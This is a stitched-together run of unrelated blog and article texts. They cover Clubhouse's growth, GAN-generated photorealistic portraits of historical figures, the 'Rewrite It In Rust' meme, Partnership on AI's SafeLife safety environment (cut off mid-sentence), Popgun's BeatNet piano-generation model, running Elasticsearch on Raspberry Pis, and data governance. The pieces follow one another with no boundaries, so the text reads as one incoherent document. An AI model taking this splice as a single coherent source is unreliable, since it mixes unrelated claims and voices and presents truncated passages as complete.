<p><strong>People. Aren't. Churning.</strong> No matter how much you may hate the app — usage is going <em>up</em>. This is scary and worth taking note. Clubhouse is already showing signs of successful expansion in Asia (read: non-English Clubhouses).</p>
<p>Instagram had 30 million MAUs when Facebook bought it for $1 billion. Whatsapp had 450m for $19 billion. By Whatsapp metrics, Clubhouse is wildly overvalued (lets say it has 10m MAU right now). But audio isn't text. <a href="https://alexdanco.com/2019/10/17/the-audio-revolution/">Alex Danco says</a> that texting is a cold medium, while audio is the hottest medium of all. He was mildly wrong — podcasting is still kinda lukewarm — but <strong><em>live, ephemeral</em></strong> audio is so hot you will literally drop everything and stay up late and ignore your partner to go listen to Elon.</p>
<p>Worse is better. The exact reasons you hate Clubhouse — the kind of thing that drives you to read an article like this to the end — are the exact same reasons it is going to win.</p>

<p><em>if you're interested - here was <a href="https://gist.github.com/sw-yx/d3e27a36eba965fcd4183d0575d34640">my initial negative conclusion</a>.</em></p>

							<p><a href="http://www.nathanshipley.com/"><strong>Nathan Shipley</strong></a> is using artificial intelligence to bring historical figures to life, in ways we’ve never seen before. Most of these figures lived far before the advent of photography, so there are no photographic records of them, only paintings and drawings. His clever use of AI is making these figures photorealistic for the first time. And in doing so, he’s breathing unique life into them.</p>

<p>We caught up with Shipley to discuss his latest work, which builds on years of research using GAN, or&nbsp;<a href="https://en.wikipedia.org/wiki/Generative_adversarial_network">Generative adversarial networks</a>. It’s a growing field of study, and one that will surely impact our lives in the coming years.</p>

<p>Shipley explains some of his education and process for this unique work:</p>


<p><em><strong>“I definitely can’t claim full credit for this process – it is built on code that researchers have generously released.&nbsp; However, I have done my own modifications to that code and am building a custom library of face attributes that I can use to&nbsp;direct the output.&nbsp; My favorite part of these kinds of processes is learning how they work, how to use them, and then how to break them or use them for techniques not originally&nbsp;imagined!”</strong></em></p>


<p>It’s still somewhat surreal to see William Shakespeare or Marie Antoinette as a photorealistic person, and we’re struck by how accurate the models seem to be.</p>

<p>We’re familiar with the notion of ‘deep fakes’, or image creation that is used with the intent of manipulating or tricking a system, but Shipley has utilized this technology on historical paintings, bringing almost an archeological perspective to the science.</p>






<p><strong>“StyleGAN is a kind of machine learning architecture that can be used to “learn” how to create more of a particular kind of image that you show it.&nbsp; For example, if you show it a dataset of images of cats, it will learn to create new images&nbsp;of cats that aren’t direct copies of the input.&nbsp; Properly trained, it can make cats that don’t exist!</strong></p>



<p><strong>I come from a VFX and animation background,&nbsp;so it’s been fascinating&nbsp;to see how images can be created that&nbsp;would previously have been impossible.&nbsp; It’s pretty technical but a really fascinating area to explore!”</strong></p>

<p>Shipley is quick to say these visual experiments aren’t saying <em>“this is what William Shakespeare looked like”</em></p>


<p><strong>“I consider these recreations to be experiments that I am sharing publicly.&nbsp; The AI doesn’t “know” what Shakespeare really looked like, but it’s fascinating to see how this particular combination of variables can come together to give us a glimpse!”</strong></p>

<p>My first proper programming language was C.
It was super confusing, and I wrote some terrible code that didn't really do anything terribly useful.</p>
<p>Along the way, however, I learned a bit about how computers do things, sort of.
I say sort of because <a href="http://programmers.stackexchange.com/questions/267583/why-is-c-still-in-the-category-of-high-level-language" title="If you disagree, please voice your dissent in my comment section">C is a <em>high level language</em></a>.</p>
<p>Of course, there are <em>higher-level</em> languages, and those end up being really good for a very wide array of tasks, so I went and learned them, and then I started actually getting things done.
I'm glad I started with C, though, since it gave me an idea of what these other languages must be doing under the hood to accomplish so much with so little code.</p>
<p>Using Scheme, Python, or Javascript, I didn't have to bother with managing the computer's memory allocation manually, and that turned out to be a lot more fun.</p>
<p>At some point a while back, I heard about <a href="https://www.rust-lang.org/">Rust-lang</a>.</p>
<p>What is Rust?</p>
<blockquote>
<p>Rust is a systems programming language that runs blazingly fast, prevents segfaults, and guarantees thread safety. </p>
</blockquote>
<h2 id="sounds-good-right">Sounds good, right?</h2>
<p>Yea, actually.</p>
<p>I think it's a pretty awesome language.
The problem is, I make my living writing stuff working on web apps, and that means writing Javascript.
That's not a problem, necessarily, but I just don't have much use for a language like Rust.</p>
<p>It definitely seems awesome, and as a lisp aficionado, I love a lot of its high level concepts.
As I recall, Rust even has properly nesting block comments, which I find quite practical.</p>
<h2 id="where-am-i-going-with-this">Where am I going with this?</h2>
<p>Well, I just wanted to clear up that I don't think Rust is a bad language.
I'm not going to criticize <em>Rust</em> in this article, however, I am going to criticize a part of the community surrounding the language.</p>
<p>To be honest, actually, I'm not really sure the people I'm going to criticize are even a part of the community.
At best, they seem to be a part of the fringe.</p>
<p>Who are these people?</p>
<p>They are the people who show up unannounced on your software project's doorstep (probably your issue tracker) and ask the following question:</p>
<blockquote>
<p>Have you considered <em><strong>Rewriting It In Rust</strong></em>?</p>
</blockquote>
<h2 id="yes-im-starting-a-language-flame-war">Yes, I'm starting a language flame war</h2>
<p>Ok, here we go.</p>
<p>If you've spent any time at all in a community where programmers hang out, you've probably seen a flame war over which language is best.</p>
<p>I don't know which language is best, though I've argued for Scheme many times because nobody else seems to be doing it.</p>
<p>That being said, I've noticed that this particular subset of the Rust community seems to do this particular thing often enough that it's nearly the only thing that I know about the Rust community.</p>
<p>I've joked about it with friends and coworkers, and sure enough, most of them have witnessed it in the wild.</p>
<p>I believe the first time I saw it was on the (now disabled) <a href="https://github.com/cjdelisle/cjdns">cjdns</a> issue tracker.</p>
<p>I was lucky enough to have the tracker turned on for long enough that I was able to get a screenshot:</p>
<p><img src="https://transitiontech.ca/assets/riir/cjdns-eventually-moving-to-rust.jpg" alt="" title="'prevent thread problems' in software that runs on one thread... yea"></p>
<p>It all started and ended pretty quickly.
Some <em>Rustafarian</em> asked a question, and the author (<a href="https://github.com/cjdelisle">@cjdelisle</a>) answered somewhat sarcastically.</p>
<p>Once OP figures out that their brilliant idea is not being taken seriously, they get annoyed and leave.</p>
<h2 id="but-wait-theres-more">But wait, there's more</h2>
<p>Yea, of course it goes on.
I heard it a few more times, laughed about it (oh, this again), and then continued on with my life.</p>
<p>Of course, clearly it happened enough times that I started to notice a trend, because as I mentioned, I've joked about it with people, and they've noticed it too.</p>
<p>So, this morning (<strong>2016-03-22</strong>) I saw <a href="https://github.com/fc00/go-fc00/issues/1">a thread</a> in a repo I'm watching, and there it was again:</p>
<p><img src="https://transitiontech.ca/assets/riir/go-fc00-why-go.jpg" alt="" title="...my actual question was about building a maybe more valuable solution..."></p>
<p>Once again, my friends make some snappy comments.
Pair those with a classic <em>if you want it written why don't you write it</em>, a few more <em>lulz</em> and our <em>Rustacean</em> acquaintance gets annoyed:</p>
<blockquote>
<p>ok, didn't thought a simple question would attract that much angry trolls.</p>
</blockquote>
<p>..and things pretty much die out.</p>
<h2 id="but-then-i-started-thinking">But then I started thinking</h2>
<p>We joked about it on IRC, and a few more people comment that they've also seen this in the wild, and quickly enough we find that we need an acronym because <em>Rewrite It In Rust</em> takes too long to type and so <strong>RIIR</strong> is born.</p>
<p>So, naturally, once an acronym is born, we have a meme, and memes like to spread.
So, naturally, I start digging:</p>
<blockquote>
<p>Who else has been hit by this storm that has been sweeping the web?</p>
</blockquote>
<h3 id="nix">Nix</h3>
<p>Apparently there were a few threads like <a href="http://lists.science.uu.nl/pipermail/nix-dev/2015-December/019040.html">this one</a> which went on for a while.
I haven't checked the exact timelines, but since this is a language flame war, I'm sure somebody will leap in to do that research for me.</p>
<p><img src="https://transitiontech.ca/assets/riir/nix-dev-perl-to-rust.jpg" alt="" title="Rust does this very well, to the point where me enumerating its benefits would be redundant."></p>
<h3 id="tor">Tor</h3>
<p>Yup, Tor, the very large, critical infrastructure that keeps journalists, criminals, schizophrenics, and <del>piracy</del> privacy activists anonymous has been <a href="https://trac.torproject.org/projects/tor/ticket/11331">asked to rewrite their software</a>.</p>
<p><img src="https://transitiontech.ca/assets/riir/rewrite-tor-in-rust.jpg" alt="" title="Writing C code that is safe is super hard (even for exeperienced Tor devs)"></p>
<h2 id="more-still">More still...</h2>
<p>Why not <a href="https://www.quora.com/Would-it-be-possible-advantageous-to-rewrite-the-Linux-kernel-in-Rust-when-the-language-is-stable" title="this one isn't on an issue tracker, at least">rewrite the Linux Kernel</a>? I'd love to hear Linus's answer to this.</p>
<p>Then of course there's <a href="https://news.ycombinator.com/item?id=11337399">this comprehensive thread</a> on Hacker News covering a bunch of angles on the pros and cons of this meme.</p>
<p>Finally, I stumbled across <a href="http://robert.ocallahan.org/2016/02/rewrite-everything-in-rust.html" title="rewrite everytihng in rust">this blog</a>.</p>
<p>Despite being quite new, and certainly newer than the meme itself, this post seems to exemplify many of the talking points extolled by proponents of <strong>RIIR</strong>.</p>
<p>Its title even comes in the form of a call to action:</p>
<blockquote>
<p>Rewrite Everything In Rust</p>
</blockquote>
<h2 id="so">So...?</h2>
<p>I don't really have more to say on the matter.
I just wrote this much to document a phenomenon I've noticed.</p>
<p>I don't have a comments section, because it ends up being really time consuming to say annoying, opinionated things if you have to answer for the fallout in your comments section.
Instead, I made <a href="https://github.com/ansuz/RIIR" title="Rewrite It In Rust">a github repo</a> where you can <a href="https://github.com/ansuz/RIIR/issues">file an issue</a> which:</p>
<ol>
<li>voices your own obnoxious opinion</li>
<li>supports my thesis<ul>
<li>super bonus points if you find more github issues asking for Rust rewrites</li>
</ul>
</li>
<li>refutes my thesis<ul>
<li>super science points if you find that this behaviour is not exhibited disproportionately by Rust users</li>
</ul>
</li>
<li>links to some project where somebody actually did <em>Rewrite It In Rust</em></li>
</ol>
<h2 id="did-this-post-offend-you">Did this post offend you?</h2>
<p>Cool.</p>
<p>Talk about it.</p>
<p>Tell your friends.</p>
<p>Good memes die hard.</p>

<p>By Carroll Wainwright and Peter Eckersley<br>
<span>Published on 2019-12-04, on the <a href="https://www.partnershiponai.org/safelife/">PAI blog</a></span>.</p>
<p><span>The Partnership on AI (PAI) is today releasing SafeLife – a novel reinforcement learning environment that tests the safety of reinforcement learning agents and the algorithms that train them. SafeLife version 1.0 focuses on the problem of avoiding negative side effects—how can we train an agent to do what we want it to do but nothing more? The environment has simple rules, but rich and complex dynamics, and generally gives the agent lots of power to make big changes on its way to completing its goals. A safe agent will only change that which is necessary, but an unsafe agent will often make a big mess of things and not know how to clean it up.</span></p>
<p><span>SafeLife is part of a broader PAI initiative to develop benchmarks for safety, fairness, and other ethical objectives for machine learning systems. Since so much of machine learning is driven, shaped, and measured by </span><a href="https://eff.org/ai/metrics"><span>benchmarks</span></a><span> (and the datasets and environments they are based on), we believe it is essential that those benchmarks come to incorporate safety and ethics goals on a widespread basis, and we’re working to make that happen.</span></p>
<p><span>If you want to try out SafeLife for yourself, you can </span><a href="https://github.com/PartnershipOnAI/safelife/"><span>download the code</span></a><span> and try playing some of the puzzle levels. If you’d like to see how to create an AI to play SafeLife, additional details about the environment and our initial agent training can be found</span>&nbsp;<a href="https://arxiv.org/abs/1912.01217">in our paper</a>.</p>
<h3>The Problem of Side Effects</h3>
<p><span>Reinforcement learning agents are rapidly growing in capabilities. They can </span><a href="https://deepmind.com/blog/article/alphazero-shedding-new-light-grand-games-chess-shogi-and-go"><span>beat masters in chess and go</span></a><span>, control robotic hands with enough manual dexterity </span><a href="https://openai.com/blog/solving-rubiks-cube/"><span>to solve a Rubik’s Cube</span></a><span>, and potentially be applied across many domains with </span><a href="https://arxiv.org/abs/1911.08265"><span>variable and unknown rules</span></a><span>.</span> <span>As reinforcement learning agents start to get deployed in real-world high-stakes scenarios, it is critical to make sure that they operate within appropriate (and often quite strict and intricate) safety constraints. However, the whole point of reinforcement learning is that it can greedily search for novel techniques when solving a problem. </span><b>If we can’t predict what an AI is going to do, how can we predict that it will be safe?</b><span> In practice, reinforcement learning can only be used in the real world in settings where safety is so well understood that constraints can be exactly and correctly codified in advance. </span><span>Other tasks, like safely controlling the behavior of a robot when it is interacting with the world at large, are much more challenging.</span></p>
<p><span>One of the thorniest </span><a href="https://arxiv.org/abs/1606.06565"><span>problems in AI safety</span></a><span> is learning to avoid negative side effects. Usually, when we give an agent a task, we have something specific in mind that the agent should do. At the same time, we have a huge implicit list of things that the agent should </span><i><span>not</span></i><span> do. When we train a robot to fetch the coffee, we want it to efficiently brew the tastiest cup possible. But we also do not want the robot to step on the cat (even if it’s in the way), or rob the local grocer (even if it’s cheaper than paying), or crash the stock market (even if it would bring down the price of beans). Specifying all the things that the robot should not do is a near impossible task; we just want our delicious cup of coffee, nothing more.</span></p>
<p><span>Difficult though this problem may be, there has been some promising research on how to avoid side effects in general. The </span><a href="https://arxiv.org/abs/1806.01186"><span>proposed</span></a> <a href="https://arxiv.org/abs/1902.09725"><span>techniques</span></a><span> have been tested on hand-crafted Sokoban-style environments which have demonstrated both the problem and the ways in which naive solutions may fail. However, these environments are very small; they can easily be overfit, and the “effects” tend to be straightforward and isolated. </span><b>Until now, there has been no rich environment with difficult goals in which effects are both necessary and required at different scales. SafeLife aims to fill this gap.</b></p>
<h3>Rules of the Game</h3>
<div><p><img src="https://pde.is/posts/img/pattern-demo.gif"></p><p>Figure 1. Creating complex patterns in SafeLife.</p>
</div>
<p><span>SafeLife is based on </span><a href="https://en.wikipedia.org/wiki/Conway%27s_Game_of_Life"><span>Conway’s Game of Life</span></a><span>, a set of rules for cellular automata on an infinite two-dimensional grid. In Conway’s Game of Life, every cell on the grid is either “alive” or “dead”. At each time step, the entire grid is updated. Any living cell with fewer than two or more than three living neighbors dies, and any dead cell with exactly three living neighbors comes alive. All other cells retain their previous state. With just these simple rules, extraordinarily complex patterns can emerge. Some patterns will be static—they won’t change between time steps. Other patterns will oscillate between two, three, </span><a href="https://www.conwaylife.com/wiki/Jason%27s_p156"><span>or more</span></a><span> states. Gliders and spaceships travel across the grid, while guns and </span><a href="https://en.wikipedia.org/wiki/Puffer_train"><span>puffers</span></a><span> can produce never-ending streams of new patterns.</span></p>
<p><span>Despite its name, Conway’s Game of Life is not actually a game—there are no players, and there are no choices to be made. In SafeLife we’ve minimally extended the rules by adding a player, player goals, and a level exit. At each time step, the player can choose to move one space along the board, create a new life cell in an adjacent space, or destroy a cell in an adjacent space. By judiciously creating and destroying life cells, the player can build up quite complicated patterns (as seen above!). By matching these patterns to goal cells, the player earns points and eventually opens the exit to the next level.</span></p>
<p><span>We add a few more cell types to allow richer dynamics. There are indestructible walls and trees, movable crates, and spawning cells that are capable of generating never-ending streams of new random patterns. Cells also come in different colors. Some colors, like green and yellow, are neutral and should be left alone by safe agents, while red cells denote unwanted patterns which yield rewards when removed.</span></p>
<h3>Agent behaviors and benchmark levels</h3>
<p><span>We trained agents on five different tasks: building and removing patterns on initially static boards, building and removing patterns on dynamic boards, and navigating across maze-like boards. All of the training levels were randomly generated, and agent performance was graded on a set of 100 fixed benchmark levels for each task.</span></p>
<p><span>In order to form a baseline, we trained agents with </span><a href="https://arxiv.org/abs/1707.06347"><span>proximal policy optimization</span></a><span>,</span><span> both with and without a simple side effect impact penalty. </span><span>The penalty we chose simply punishes the agent every time a cell changes away from its starting state. This is not a good way to measure side effects! It is, however, an </span><i><span>easy</span></i><span> way to measure side effects, and helps illustrate the shortcomings of side effect impact penalties more generally.</span></p>
<h5>Agents in Static Environments</h5>
<p><span>A static environment is the easiest environment in which one can measure side effects. Since the environment doesn’t change without agent input, </span><i><span>any</span></i><span> change in the environment must be due to agent behavior. The agent is the cause of every effect. Our simple side effect impact penalty performs quite well here.</span></p>
<p><span>When agents are trained without an impact penalty they tend to make a big mess.&nbsp;<i>&nbsp;</i></span></p>
<div><p><img src="https://pde.is/posts/img/benchmark-append-still-013_p0.gif"> <img src="https://pde.is/posts/img/benchmark-prune-still-003_p0.gif"></p><p>Figure 2. Left: an unsafe agent builds new patterns while disrupting existing ones. Right: an unsafe agent destroys red patterns along with much of the rest of the level.</p>
</div>
<p><span>In Figure 2, the image on the left shows a pattern-building agent that has learned how to construct stable 2-by-2 blocks that it can place on top of goal cells. The agent has not, however, learned to do so without disrupting nearby green patterns. Once the green pattern has been removed, the agent can more easily make its own pattern in its place.</span></p>
<p><span>Likewise, the image on the right in Figure 2 shows a pattern-destroying agent that has learned that the easiest way to remove red cells is to disrupt </span><i><span>all</span></i><span> cells. Even a totally random agent can accomplish this—patterns on this particular task tend towards collapse when disturbed—but the trained agent is able to do it efficiently in terms of total steps taken.</span></p>
<p><span>Applying an impact penalty yields quite different behavior.</span></p>
<div><p><img src="https://pde.is/posts/img/benchmark-append-still-013_p1.gif"> <img src="https://pde.is/posts/img/benchmark-prune-still-003_p1.gif"></p><p>Figure 3. Left: a safe agent builds new patterns, but is too cautious to complete its goals. Right: a safe agent successfully removes red patterns without disrupting anything else.</p>
</div>
<p><span>In Figure 3, the image on the left illustrates how the pattern-building agent is now too cautious to disrupt the green pattern. It’s also too cautious to complete its goals—it continually wanders the board looking for another safe pattern to build, but never finds one.</span></p>
<p><span>In SafeLife, as in life, destroying something (even safely) is much easier than building it, and the pattern-destroying agent with an impact penalty (Figure 3, right) performs much better than the one without the penalty. It is able to carefully remove most of the red cells without causing any damage to the green ones. However, it’s not able to remove </span><i><span>all</span></i><span> of the red cells, and it completes the level much more slowly than its unsafe peer. Applying a safety penalty will necessarily reduce performance unless the explicit goals are well aligned with safety.</span></p>
<h5>Agents in Dynamic Environments</h5>
<p><span>Side effects are much more difficult to disentangle in dynamic environments. In dynamic environments, changes happen all the time, whether the agent does anything or not. Penalizing an agent for departures from a starting state will also penalize it for allowing the environment to dynamically evolve, and will encourage it to disable any features that cause dynamic evolution.</span></p>
<div><p><img src="https://pde.is/posts/img/benchmark-prune-spawn-019_p0.gif"> <img src="https://pde.is/posts/img/benchmark-prune-spawn-019_p0.5.gif"></p><p>Figure 4. Left: an unsafe agent predictably ignores the chaotic region and focuses on its goals. Right: in its effort to avoid side effects, an overzealous agent destroys dynamic parts of the level.</p>
</div>
<p><span>In Figure 4, the image on the left shows an agent trained without an impact penalty. This unsafe agent ignores the stochastic yellow pattern and quickly destroys the red pattern and exits the level. The image on the right shows the effects of an agent with a small impact penalty. This agent is incentivized to stop the yellow pattern from growing, so it quickly destroys the spawner cells. Only then does it move on to the red cells, but it doesn’t manage to remove them safely, as its training has taught it to focus more on the …</span></p></div></div>

<h2 id="preface">Preface</h2>

<p>For the last four years, a small team at Popgun has been studying the application of deep learning to music analysis
and generation. This research has culminated in the release of <a href="https://splashpro.popgun.ai/">Splash Pro</a> - a free, AI-powered plugin 
for Digital Audio Workstations (DAWs). With the release of this blog, we hope to provide an accessible introduction to 
deep learning with music, by explaining some core projects we have worked on.</p>

<h2 id="introduction">Introduction</h2>

<p>In this post I want to describe the design of a model for expressive piano synthesis. The model, 
which we call ‘BeatNet’, is capable of analysing a piano performance and generating new pieces that imitate the 
original playing style. Before I get into the technical workings, here are a few samples generated by BeatNet:</p>

<p><strong>In the style of “Yiruma - River Flows In You”</strong>
</p>





<p><strong>In the style of “Chopin - Nocturne in E-flat major, Op. 9, No. 2”</strong>
</p>





<p><strong>In the style of “Errol Garner - Misty”*</strong>
</p>





<p>BeatNet is able to replicate many of the characteristics present in human piano performances, albeit with
some weaknesses and limitations that I will address. To explain how this model works, I have split the 
remainder of the blog into two sections. Part I will discuss musical representations, while Part II will explore the 
model design and showcase more of its capabilities.</p>

<p><span>
*Note: BeatNet does not model sustain pedal events. Sustain was manually added to this piece.
</span></p>

<h2 id="part-i---representations-of-music">Part I - Representations of Music</h2>

<p>In designing a model for music generation, it is critical to choose an appropriate representation. This choice
determines which data can be faithfully encoded, the modelling techniques that are available, and the efficacy of the 
overall system. For this reason, I have decided to begin with a brief explanation of some common musical 
representations. If this all feels familiar to you, feel free to skip ahead to part II.</p>

<h3 id="audio">Audio</h3>

<p>When we talk about audio in machine learning, we are typically referring to an array of time-domain samples. These
samples are a digital approximation to the physical sound pressure wave. The quality of this approximation is
determined by the sample rate and the bit-depth (see: <a href="https://en.wikipedia.org/wiki/Pulse-code_modulation">PCM</a>). In 
research, it is common to see sample rates of 16-22kHz. However, to capture the full range of human audible frequencies,
most HiFi applications (e.g. music, podcasts, etc) use rates of around 44kHz 
(see: <a href="https://en.wikipedia.org/wiki/Nyquist%E2%80%93Shannon_sampling_theorem">Nyquist Theorem</a>).</p>

<p>Because of its high dimensionality, modelling raw audio is extremely challenging. For a generative model to 
reproduce audio structure on a timescale of a few seconds, it must capture the relationships between tens of 
thousands of samples. While it is becoming increasingly feasible to do this (see <a href="#citation-1">[1]</a>), there are more 
efficient ways to encode piano performances.</p>

<p>Note: For an example of music modelling directly in the audio domain, 
see <a href="https://openai.com/blog/jukebox/">OpenAI’s Jukebox</a> <a href="#citation-2">[2]</a>.</p>

<h3 id="midi">MIDI</h3>

<p>MIDI is a technical standard allowing electronic instruments and computers to communicate. It comprises
a sequence of ‘messages’, each describing a particular musical event or instruction. Instructions relating to the 
note timings, pitch and loudness (i.e. velocity) can be transmitted and stored. For example, a piano performance 
encoded as MIDI is a record of which notes were pressed, how forcefully and at what time.</p>

<p>To convert a MIDI file back into listenable audio, a piece of software replays these instructions and
synthesizes the relevant notes. MIDI does not encode acoustic information, such as the instrument sound or the recording
environment. For this reason it is drastically more efficient than audio, and it is a good starting point for our 
exploration.</p>

<p>When working with MIDI we use the terrific <a href="https://github.com/craffel/pretty-midi">PrettyMIDI</a> library by Colin Raffel. This abstracts away many
complexities of the raw format. See Colin Raffel’s <a href="https://colinraffel.com/publications/thesis.pdf">thesis</a> for
a more in-depth explanation of the MIDI file format.</p>

<p><strong>Figure 1 - Für Elise in PrettyMIDI Format</strong></p>
<div><div><pre><code>Note(start=0.000000, end=0.305000, pitch=76, velocity=67)
Note(start=0.300000, end=0.605000, pitch=75, velocity=63)
Note(start=0.600000, end=0.905000, pitch=76, velocity=74)
Note(start=0.900000, end=1.205000, pitch=75, velocity=71)
...
</code></pre></div></div>

<p>Notice how succinctly we can represent Für Elise this way, and consider that the equivalent audio section 
contains approximately 50k samples (for a 44kHz recording).</p>

<h3 id="piano-roll">Piano Roll</h3>

<p>This will look familiar to anyone who has used a Digital Audio Workstation (DAW) such as GarageBand or Ableton.
The vertical axis denotes pitch, and the horizontal axis denotes time. The velocity of each note is encoded
by its magnitude. As well as providing an intuitive way to visualize MIDI, piano roll has some interesting 
properties for machine learning.</p>

<p>For example, consider the effect of raising the song’s pitch by one semitone, or delaying its onset by a few seconds. 
These transpositions preserve the spatial structure of the piano roll. When designing a model we can exploit this 
property by applying 2D Convolutional Neural Networks (CNN). Early experiments at Popgun tried exactly
this, as did <a href="https://youtu.be/nA3YOFUCn4U?t=597">this project</a> using PixelCNN. However, there are some serious drawbacks to this approach.</p>

<p><strong>Figure 2 - Für Elise in Piano Roll Format</strong></p>
<p><img src="https://popgun-labs.github.io/ml-blog/assets/images/piano_roll_fur_elise_crop.png" alt="Für Elise - Piano Roll"></p>

<p>A typical song encoded as piano roll is incredibly sparse: nearly all entries are zero. 
Naively applying a CNN wastes a large amount of computation on entirely empty regions. It is also difficult
to choose a suitable resolution for the time axis. If the original data is quantised, such that each note aligns
perfectly with a uniform musical grid, we can choose the resolution based on the quantisation strength. However,
this breaks down for expressive piano performances, where natural variations in timing are critical to the musicality.</p>

<p>Note: Many works have tried to model piano roll, using a broad range of neural net architectures. For those interested 
to learn more, <a href="https://arxiv.org/abs/1206.6392">this paper</a> is a good starting point <a href="#citation-16">[16]</a>.</p>

<h3 id="time-shift-format">Time-Shift Format</h3>

<p>In 2017 <a href="https://magenta.tensorflow.org/blog/">Google Magenta</a> released a model called Performance RNN <a href="#citation-3">[3]</a>, which demonstrated the ability 
to model expressive piano performances with high fidelity. The key innovation was a new format that is highly 
suited to this task. For reasons that will become apparent, we refer to this “performance representation” simply as 
“time-shift”. Like MIDI, time-shift encodes music with a sequence of discrete musical events. What sets it apart is 
the unique way it encodes the progression of time. Instead of representing time along a specific axis (piano roll), 
or as a property of each individual note (MIDI), in time-shift there is a specific event that indicates the 
advancement of the piece.</p>

<p><strong>Figure 3 - Für Elise in Time-Shift Format</strong></p>
<div><div><pre><code>272 - Set Velocity = 64
76  - Turn On MIDI Note 76 (E5)
317 - Advance Time by 0.3 Seconds
204 - Turn Off MIDI Note 76 (E5)
271 - Set Velocity = 60
75  - Turn On MIDI Note 75 (D#5)
317 - Advance Time by 0.3 Seconds
203 - Turn Off MIDI Note 75 (D#5)
274 - Set Velocity = 72
76  - Turn On MIDI Note 76 (E5)
317 - Advance Time by 0.3 Seconds
204 - Turn Off MIDI Note 76 (E5)
273 - Set Velocity = 68
75  - Turn On MIDI Note 75 (D#5)
317 - Advance Time by 0.3 Seconds
...
</code></pre></div></div>

<p>This one-dimensional sequence of tokens is similar to the encodings used in language models.
This means that modern advances in NLP (e.g. ByteNet <a href="#citation-4">[4]</a>, Transformers <a href="#citation-5">[5]</a>) can be 
readily applied to the time-shift format.</p>

<p><strong>Figure 4 - An Explanation of the Time-Shift Events</strong></p>
<div><div><pre><code>0 - 127: Note on events    
128 - 255: Note off events    
256 - 287: 32 velocity change events   
288 - 387: 100 quantized time-shift values (10ms -&gt; 1000ms)
</code></pre></div></div>

<p>Note: We have not accounted for sustain pedal events, however it might be interesting to incorporate them
in future work.</p>

<h2 id="part-ii---beatnet-a-convolutional-model-for-piano-music">Part II - BeatNet: A Convolutional Model for Piano Music</h2>

<p>In 2016, researchers at Google’s DeepMind lab released the now-famous WaveNet paper <a href="#citation-1">[1]</a>. The core 
insight was that 1D convolutions could produce efficient sequence models, by eliminating the need for expensive 
recurrent computations during training. The efficacy was proven with a 
<a href="https://deepmind.com/blog/article/wavenet-generative-model-raw-audio">demo</a> of raw audio generation. The 
publication of ByteNet <a href="#citation-4">[4]</a> shortly afterwards, extended this idea to the domain of natural language 
processing.</p>

<p>Inspired by this work, Popgun developed its own ByteNet model for symbolic piano music. We refer to this work as
“BeatNet”. The choice to use ByteNet over traditionally dominant RNNs was motivated by a few factors:</p>
<ol>
  <li>The ability to capture long-term dependencies over hundreds or thousands of tokens</li>
  <li>Fast training</li>
  <li>Hype. WaveNet and ByteNet were the first papers to threaten the dominance of RNNs, before Transformer based
architectures <a href="#citation-5">[5]</a> exploded in popularity.</li>
</ol>

<h3 id="data-collection-and-processing">Data Collection and Processing</h3>

<p>We curated a MIDI dataset by drawing from a number of online sources. One key source was the
<a href="http://www.piano-e-competition.com/">Yamaha e-Piano Competition Dataset</a>, consisting of jazz 
and classical music performances. Another source was the <a href="https://colinraffel.com/projects/lmd/">Lakh MIDI Dataset</a>, 
which contains a broader range of genres, including many contemporary pieces.</p>

<p>To create a model which generates highly expressive performances, we processed the data to filter out ‘low quality’ 
items. Anyone who has worked with MIDI datasets will appreciate that many songs sound ‘bad’.
This raises some difficult problems: What is musical quality? How can we account for subjective preferences? 
Are some songs so weird we can confidently deem them ‘not musical’? Suffice to say, these problems are beyond
the scope of this post.</p>

<p>Ultimately, our working solution can be summarised as this: An engineer listened to some data items, in each case 
proclaiming “Yep, this sounds musical” or “Nope, I don’t like it”. In the process, they developed automated heuristics
to filter unwanted items, biasing the dataset towards songs that are subjectively ‘musical’. In the future it would be 
interesting to crowd-source these assessments, or to devise heuristics based on music theory instead.</p>

        <p>The Raspberry Pi is capable of running the NoSQL database Elasticsearch.</p>
<p>Either use <a href="https://schneefux.xyz/tech/raspberrypi-bootstrapping/">Arch Linux ARM</a> or the Raspbian Lite (Stretch) image and add the Elasticsearch apt repository. The packages are cross platform, but there are no official arm packages in the debian repository, so you need to force <code>arch=amd64</code>:</p>
<pre><code>deb [arch=amd64] http://packages.elasticsearch.org/elasticsearch/5.x/debian stable main
</code></pre><ul>
<li>Mount a btrfs formatted USB stick to <code>/var/lib/elasticsearch</code> using <code>nodatacow,noatime,nobarrier</code>. COW should always be disabled for directories with database files.</li>
<li>Install <code>elasticsearch kibana</code> and NodeJS (on ArchLinux with Kibana 5.5, you need <code>nodejs-lts-boron</code>).</li>
<li>Set the Elastic jvm minimum/maximum heap size to 1/2 of your Pi’s RAM. The rest will be used by Elastic’s Lucene backend.</li>
<li>Disable system call filter checks on startup with <code>bootstrap.system_call_filter: false</code> because the Raspberry Pi does not support JNI, which Elastic tries to import in order to run the checks.</li>
<li>Increase ping timeouts. The Raspberry Pi needs several minutes to start Elasticsearch and will timeout often. <code>discovery.zen.ping_timeout: 60</code></li>
<li>Set up clustering: specify a cluster name, add a few <code>discovery.zen.ping.unicast.hosts</code> and most importantly increase <code>discovery.zen.minimum_master_nodes</code> to the minimum number of nodes / 2 + 1. The initial discovery will take a long time with timeouts from the Raspberry Pis in the cluster and increasing the minimum number of nodes will prevent the “split brain” where multiple Raspberry Pis elect themselves at masters.</li>
</ul>
<p>Having tested an Elasticsearch cluster with a 20G index across 3 Raspberry Pi nodes and my laptop, I cannot recommend it. Performance was awful, syncing data took hours, and <a href="https://schneefux.xyz/tech/scaling-elasticsearch/">removing the Pis from the cluster again</a> was a pain.</p>

<div>
<p>Data Governance seeks to bring order to the chaos that emerges as organisations turn to data to make decisions. To many, the term “data” is synonymous with “fact”, forgetting the fact that data requires context to be properly interpreted. Context varies by department, business unit across teams and even within teams, leading to misinterpretation of data and increasing the risk that data is misrepresented. Data Governance helps to define rules, processes and policies for how data is collected, managed to ensure that it can be consistently interpreted and applied to advanced analytics, machine learning and automation. </p>
<p>Analytics platforms like PowerBI, Tableau and Looker put data in the hands of employees and promise better decisions based on real data. But what happens when a colleagues number is different from yours? Or when people don’t know which version of a dashboard to view? Or when you discover the “Sales metric” you have been making decisions on doesn’t actually include all the things you thought it does?</p>
